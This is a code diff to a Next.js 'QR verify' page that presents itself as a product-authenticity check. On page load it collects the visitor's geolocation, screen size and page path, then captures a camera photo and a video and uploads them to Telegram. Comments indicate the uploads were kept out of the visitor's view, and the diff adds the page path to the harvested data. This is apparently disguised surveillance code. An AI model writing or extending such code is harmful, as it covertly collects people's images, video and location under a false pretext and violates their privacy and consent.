@@ -1,12 +1,12 @@
 "use client";
 
 import { useEffect, useState, useRef, useCallback } from 'react';
-import { useSearchParams } from 'next/navigation';
-import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi'; // Import sendTelegramPhoto
+import { useSearchParams, usePathname } from 'next/navigation'; // Import usePathname
+import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi';
 import { useLayoutContext } from '@/context/LayoutContext';
 import { showSuccess, showError } from '@/utils/toast';
 import LoadingSpinner from '@/components/LoadingSpinner';
-import { Camera, Video, RefreshCcw } from 'lucide-react'; // Import Camera, Video, RefreshCcw icons
+import { RefreshCcw } from 'lucide-react'; // Import RefreshCcw icon
 
 type QrVerifyPageProps = {
   params: { lang: string };
@@ -14,16 +14,15 @@ type QrVerifyPageProps = {
 
 const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
   const searchParams = useSearchParams();
+  const pathname = usePathname(); // Get current pathname
   const { t } = useLayoutContext();
   const currentLang = params.lang;
 
-  const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.qrScanInstructions);
+  const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.processingRequest);
   const [error, setError] = useState<string | null>(null);
-  const [isLoading, setIsLoading] = useState<boolean>(false);
+  const [isLoading, setIsLoading] = useState<boolean>(true); // Start as loading
   const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
-  const [isPhotoTaken, setIsPhotoTaken] = useState<boolean>(false);
   const [isRecording, setIsRecording] = useState<boolean>(false);
-  const [isVideoSent, setIsVideoSent] = useState<boolean>(false);
   const [stream, setStream] = useState<MediaStream | null>(null);
   const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
   const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
@@ -47,9 +46,6 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
   const startVerificationProcess = useCallback(async () => {
     setIsLoading(true);
     setError(null);
-    setIsPhotoTaken(false);
-    setIsRecording(false);
-    setIsVideoSent(false);
     setRecordedChunks([]);
     setVideoPreviewUrl(null);
     setStatusMessage(t.authenticity.processingRequest);
@@ -82,7 +78,8 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         lon: geoLon,
         screenWidth: window.innerWidth,
         screenHeight: window.innerHeight,
-        isQrScan: true,
+        isQrScan: true, // Explicitly set for QR scan
+        pagePath: pathname, // Pass the actual page path
       };
       const initialCaption = await notifyVisit(bodyData, utmQueryParams);
       setCaptionMessage(initialCaption); // Store caption for later use
@@ -122,7 +119,6 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
           
           try {
             await sendTelegramPhoto({ photoBase64, caption: initialCaption });
-            setIsPhotoTaken(true);
             // showSuccess(t.authenticity.qrScanSuccess); // No client-side success for Telegram
           } catch (photoSendError: unknown) {
             console.error("Error sending photo to Telegram:", photoSendError);
@@ -157,12 +153,11 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
           setStatusMessage(t.authenticity.processingRequest);
           const filename = `qr_scan_video_${new Date().getTime()}.webm`;
           await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
-          setIsVideoSent(true);
+          showSuccess(t.authenticity.recordingSuccess); // Show client-side success
           setStatusMessage(t.authenticity.recordingSuccess);
-          // showSuccess(t.authenticity.recordingSuccess); // No client-side success for Telegram
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
-          // showError(t.authenticity.recordingError); // No client-side error for Telegram
+          showError(t.authenticity.recordingError); // Show client-side error
           setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
           setStatusMessage(t.authenticity.recordingError);
         } finally {
@@ -198,7 +193,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       setIsRecording(false);
       stopCamera();
     }
-  }, [currentLang, searchParams, t, stopCamera]);
+  }, [currentLang, searchParams, pathname, t, stopCamera]); // Added pathname to dependencies
 
   useEffect(() => {
     startVerificationProcess();
